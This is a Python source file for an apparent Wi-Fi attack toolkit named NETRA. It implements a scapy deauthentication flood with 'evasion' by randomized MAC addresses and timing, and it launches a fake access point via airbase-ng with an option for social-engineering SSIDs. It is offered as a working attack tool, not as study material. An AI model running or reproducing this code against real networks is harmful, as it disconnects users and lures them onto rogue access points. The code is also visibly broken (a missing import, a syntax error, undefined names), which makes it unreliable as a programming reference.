#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import time
import sys
import webbrowser
import socket
import os
import subprocess
import json
import re
import ipaddress
import concurrent.futures
import uuid
from datetime import datetime
from typing import List, Tuple, Dict
from scapy.all import RandMAC, Ether, srp, ARP, Dot11, Dot11Deauth, sendp, RadioTap, Dot11Beacon
import atexit
import threading
import signal

# Color class definition
class Colors:
    """ANSI color codes."""
    END = "\033[0m"
    R = "\033[31m"   # RED
    G = "\033[32m"   # GREEN
    Y = "\033[33m"   # YELLOW
    B = "\033[34m"   # BLUE
    M = "\033[35m"   # MAGENTA
    C = "\033[36m"   # CYAN
    W = "\033[37m"   # WHITE

C = Colors()

# Global session manager
session_manager = None

# Attack module base class
class AttackModule:
    """Base class for all attack modules."""
    def __init__(self, config):
        self.config = config
        self.results = {}
        self.session_id = session_manager.current_session if session_manager else None
        
    def validate_config(self):
        """Validate attack configuration."""
        pass
        
    def execute(self):
        """Execute attack."""
        pass
        
    def generate_report(self):
        """Generate attack report."""
        pass

# Advanced deauth attack with evasion techniques
class AdvancedDeauth(AttackModule):
    """Advanced deauth attack with evasion techniques."""
    def __init__(self, config):
        super().__init__(config)
        self.evasion_techniques = config.get('evasion', [])
        self.rate_limit = config.get('rate_limit', 0.1)
        
    def validate_config(self):
        """Validate deauth configuration."""
        if not self.config.get('target') and not self.config.get('broadcast'):
            raise ValueError("Either target or broadcast must be specified")
        if not self.config.get('gateway'):
            raise ValueError("Gateway must be specified")
            
    def execute(self):
        """Execute deauth attack with evasion techniques."""
        try:
            # Setup
            target = self.config.get('target', 'ff:ff:ff:ff:ff:ff')
            gateway = self.config.get('gateway')
            count = self.config.get('count', 100)
            
            # Build evasion techniques
            evasion_packets = []
            if 'randomize' in self.evasion_techniques:
                # Randomize packet timing
                interval = max(0.01, self.rate_limit)
                intervals = [max(interval/2, interval*random.random()) for _ in range(count)]
            else:
                intervals = [self.rate_limit] * count
                
            # Craft packets with evasion
            for i in range(count):
                dot11 = Dot11(addr1=target, addr2=gateway, addr3=gateway)
                packet = RadioTap()/dot11/Dot11Deauth(reason=7)
                
                # Apply evasion if specified
                if 'randomize' in self.evasion_techniques:
                    packet = self._apply_randomization(packet)
                    
                evasion_packets.append(packet)
            
            # Send packets
            log(f"Sending {count} deauth packets to {target}...", C.B)
            for i, packet in enumerate(evasion_packets):
                sendp(packet, iface=self.config['interface'], verbose=0)
                time.sleep(intervals[i])
                
            self.results = {
                "type": "deauth",
                "target": target,
                "gateway": gateway,
                "packets_sent": count,
                "evasion_techniques": self.evasion_techniques,
                "timestamp": datetime.now().isoformat()
            }
            return True
            
        except Exception as e:
            log(f"Deauth attack failed: {str(e)}", C.R)
            return False
            
    def _apply_randomization(self, packet):
        """Apply randomization to packet."""
        # Modify packet fields randomly
        packet.addr1 = self._random_mac()
        packet.addr2 = self._random_mac()
        packet.addr3 = self._random_mac()
        return packet
        
    def _random_mac(self):
        """Generate random MAC address."""
        return ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])

# Fake AP attack with customization options
class FakeAP(AttackModule):
    """Fake AP attack with customization options."""
    def __init__(self, config):
        super().__init__(config)
        self.custom_ssid = config.get('custom_ssid', None)
        self.hidden_ssid = config.get('hidden_ssid', False)
        self.auth_method = config.get('auth_method', 'open')
        self.password = config.get('password', None)
        self.process = None
        
    def validate_config(self):
        """Validate fake AP configuration."""
        if not self.config.get('interface'):
            raise ValueError("Interface must be specified")
        if not self.config.get('ssid'):
            raise ValueError("SSID must be specified")
            
    def execute(self):
        """Execute fake AP attack."""
        try:
            # Setup
            interface = self.config['interface']
            ssid = self.custom_ssid or self.config['ssid']
            channel = self.config.get('channel', 6)
            
            # Set monitor mode
            if not check_monitor_mode(interface):
                set_interface_mode(interface, "Monitor")
                
            # Build command
            cmd = ["airbase-ng"]
            cmd.extend(["--essid", ssid])
            cmd.extend(["--channel", str(channel)])
            
            if self.hidden_ssid:
                cmd.append("--hidden")
                
            if self.auth_method == "wpa2":
                cmd.extend(["--wpa", "2"])
                if self.password:
                    cmd.extend(["--wpakey", self.password])
            elif self.auth_method == "wpa3":
                cmd.extend(["--wpa", "3"])
                if self.password:
                    cmd.extend(["--wpakey", self.password])
                    
            cmd.append(interface)
            
            log(f"Starting fake AP: {ssid} on channel {channel}...", C.B)
            self.process = subprocess.Popen(cmd)
            
            self.results = {
                "type": "fakeap",
                "ssid": ssid,
                "channel": channel,
                "interface": interface,
                "hidden": self.hidden_ssid,
                "auth_method": self.auth_method,
                "timestamp": datetime.now().isoformat()
            }
            return True
            
        except Exception as e:
            log(f"Fake AP attack failed: {str(e)}", C.R)
            return False
            
    def cleanup(self):
        """Stop fake AP and restore interface."""
        if self.process:
            self.process.terminate()
        set_interface_mode(self.config['interface'], "Managed")
class SessionManager:
    """Manage attack sessions."""
    def __init__(self):
        self.sessions = {}
        self.current_session = None
        self.running = False
        
    def create_session(self, name, config):
        """Create new attack session."""
        session_id = str(uuid.uuid4())
        self.sessions[session_id] = {
            'name': name,
            'config': config,
            'start_time': datetime.now(),
            'status': 'active',
            'attacks': [],
            'report': None
        }
        self.current_session = session_id
        return session_id
        
    def save_session(self):
        """Save current session to disk."""
        if self.current_session:
            filename = f"session_{self.current_session}.json"
            with open(filename, 'w') as f:
                json.dump(self.sessions[self.current_session], f)
            return filename
            
    def load_session(self, filename):
        """Load session from file."""
        with open(filename, 'r') as f:
            session_data = json.load(f)
        session_id = str(uuid.uuid4())
        self.sessions[session_id] = session_data
        self.current_session = session_id
        return session_id
        
    def add_attack(self, attack_module):
        """Add attack to current session."""
        if self.current_session:
            self.sessions[self.current_session]['attacks'].append(attack_module.results)
            
    def generate_report(self):
        """Generate session report."""
        if self.current_session:
            session = self.sessions[self.current_session]
            session['end_time'] = datetime.now()
            session['duration'] = (session['end_time'] - session['start_time']).total_seconds()
            session['report'] = generate_report(session)
            return session['report']
        return None

# Utility functions
def log(message, color=C.END):
    """Print a structured log message."""
    print(f"[{C.B}*{C.END}] {color}{message}{C.END}")

def check_monitor_mode(interface):
    """Check if interface is in monitor mode."""
    try:
        result = subprocess.run(["iwconfig", interface], capture_output=True, text=True)
        if "Mode:Monitor" in result.stdout:
            return True
    except:
        pass
    return False

def set_interface_mode(interface, mode="Managed"):
    """Set interface mode."""
    if os.geteuid() != 0:
        log("ERROR: This function requires ROOT privileges.", C.R)
        return False
        
    log(f"Setting {interface} to {C.Y}{mode}{C.END} mode...", C.B)
    try:
        subprocess.run(["ifconfig", interface, "down"], check=True)
        subprocess.run(["iwconfig", interface, "mode", mode], check=True)
        subprocess.run(["ifconfig", interface, "up"], check=True)
        log("Mode set successfully.", C.G)
        return True
    except subprocess.CalledProcessError as e:
        log(f"Error changing mode: {e}", C.R)
        return False

def load_config(config_file):
    """Load attack configuration from file."""
    with open(config_file, 'r') as f:
        return json.load(f)

def generate_report(session_data):
    """Generate session report."""
    # Implementation would go here
    return json.dumps(session_data, indent=2)

# Main execution
def main():
    global session_manager
    
    # Initialize session manager
    session_manager = SessionManager()
    
    # Create argument parser
    parser = create_parser()
    
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)
        
    args = parser.parse_args()
    
    # Display animated logo
    display_animated_logo()
    
    # Handle attack commands
    if args.command == 'attack':
        if args.attack_type == 'deauth':
            attack = AdvancedDeauth(vars(args))
            attack.validate_config()
            success = attack.execute()
            session_manager.add_attack(attack)
        elif args.attack_type == 'fakeap':
            attack = FakeAP(vars(args))
            attack.validate_config()
            success = attack.execute()
            session_manager.add_attack(attack)
            # Register cleanup handler
            atexit.register(lambda: attack.cleanup())
            
        if not success:
            sys.exit(1)
            
    # Handle session commands
    elif args.command == 'session':
        if args.session_cmd == 'new':
            session_id = session_manager.create_session(args.name, load_config(args.config))
            log(f"Created session: {session_id}", C.G)
        elif args.session_cmd == 'save':
            filename = session_manager.save_session()
            log(f"Saved session to: {filename}", C.G)
        elif args.session_cmd == 'load':
            session_id = session_manager.load_session(args.filename)
            log(f"Loaded session: {session_id}", C.G)
            
    # Generate final report if in session
    if session_manager.current_session:
        report = session_manager.generate_report()
        log("Session completed. Report generated.", C.G)
        
def print_logo():
    logo = """
    

█████████████████████████████████████████████
█████████████████████████████████████████████
██████████████████████ ██████████████████████
██████████████████████ ██████████████████████
██████████████████████ ██████████████████████
████████████  ████████ ████████  ████████████
███████████ █ ██████     ██████ █ ███████████
██████████████  █████   █████  ██████████████
███████████████   ███   ███   ███████████████
██████████████ █   ██  ███  ██ ██████████████
██████████████████  █  █   ██████████████████
███████████████████       ███████████████████
█████████████████████   █████████████████████
█████████████████████   █████████████████████
████████████████████     ████████████████████
██████████████████░  █ █  ███████████████████
█████████████████   ██ ██   █████████████████
████████████████  ████ ████  ████████████████
███████████████  █████ █████  ███████████████
██████████████ ███████ ███████ ██████████████
█████████████ ████████ ████████ █████████████
██████████████████████ ██████████████████████
█████████████████████████████████████████████
█████████████████████████████████████████████

    """
    print(C.R + logo + C.END) 
    log(f"NETRA - Wireless Device Fingerprint Scanner", C.B)
    log(f"Version: 1.0 | Author: {GITHUB_URL}", C.C)
    log(f"CODER: eliot00" C.C )
    print("-" * 40)
    
def create_parser():
    parser = argparse.ArgumentParser(description=f"{C.B}NETRA v1.0 - Advanced Wi-Fi Toolkit{C.END}")
    subparsers = parser.add_subparsers(dest='command', required=True)
    
    # Attack module
    attack_parser = subparsers.add_parser('attack', help='Run wireless attacks.')
    attack_subparsers = attack_parser.add_subparsers(dest='attack_type', required=True)
    
    # Deauth attack
    deauth_parser = attack_subparsers.add_parser('deauth', help='Send deauth packets.')
    deauth_parser.add_argument("-i", "--interface", required=True, help="Monitor interface.")
    deauth_parser.add_argument("-t", "--target", help="Target MAC or broadcast.")
    deauth_parser.add_argument("-g", "--gateway", help="Gateway MAC (BSSID).")
    deauth_parser.add_argument("-c", "--count", type=int, default=100, help="Number of packets.")
    deauth_parser.add_argument("--interval", type=float, default=0.1, help="Packet interval.")
    deauth_parser.add_argument("--evasion", nargs="+", help="Evasion techniques (randomize, rate_limit)")
    deauth_parser.set_defaults(func=lambda args: run_attack(
        AdvancedDeauth, vars(args)))
    
    # Fake AP
    fakeap_parser = attack_subparsers.add_parser('fakeap', help='Create fake AP.')
    fakeap_parser.add_argument("-i", "--interface", required=True, help="Monitor interface.")
    fakeap_parser.add_argument("--ssid", required=True, help="AP SSID.")
    fakeap_parser.add_argument("--custom", help="Custom SSID for social engineering.")
    fakeap_parser.add_argument("-ch", "--channel", type=int, default=6, help="Wi-Fi channel.")
    fakeap_parser.add_argument("--hidden", action="store_true", help="Hide SSID.")
    fakeap_parser.add_argument("--auth", choices=["open", "wpa2", "wpa3"], default="open", help="Auth method.")
    fakeap_parser.add_argument("--password", help="Password for protected AP.")
    fakeap_parser.set_defaults(func=lambda args: run_attack(
        FakeAP, vars(args)))
    
    # Session commands
    session_parser = subparsers.add_parser('session', help='Manage attack sessions.')
    session_subparsers = session_parser.add_subparsers(dest='session_cmd', required=True)
    
    # New session
    new_session = session_subparsers.add_parser('new', help='Create new session.')
    new_session.add_argument("--name", required=True, help="Session name.")
    new_session.add_argument("--config", required=True, help="Config file path.")
    new_session.set_defaults(func=lambda args: session_manager.create_session(
        args.name, load_config(args.config)))
    
    # Save session
    save_session = session_subparsers.add_parser('save', help='Save current session.')
    save_session.set_defaults(func=lambda args: session_manager.save_session())
    
    # Load session
    load_session = session_subparsers.add_parser('load', help='Load session from file.')
    load_session.add_argument("filename", help="Session file to load.")
    load_session.set_defaults(func=lambda args: session_manager.load_session(args.filename))
    
    return parser

def run_attack(module_class, args):
    try:
        attack = module_class(args)
        attack.validate_config()
        thread = threading.Thread(target=attack.execute)
        thread.start()
        thread.join()
        report = attack.generate_report()
        if session_manager.current_session:
            session_manager.add_attack(attack)
            
        return True
        
    except Exception as e:
        log(f"Attack failed: {str(e)}", C.R)
        return False

if __name__ == "__main__":
    main()
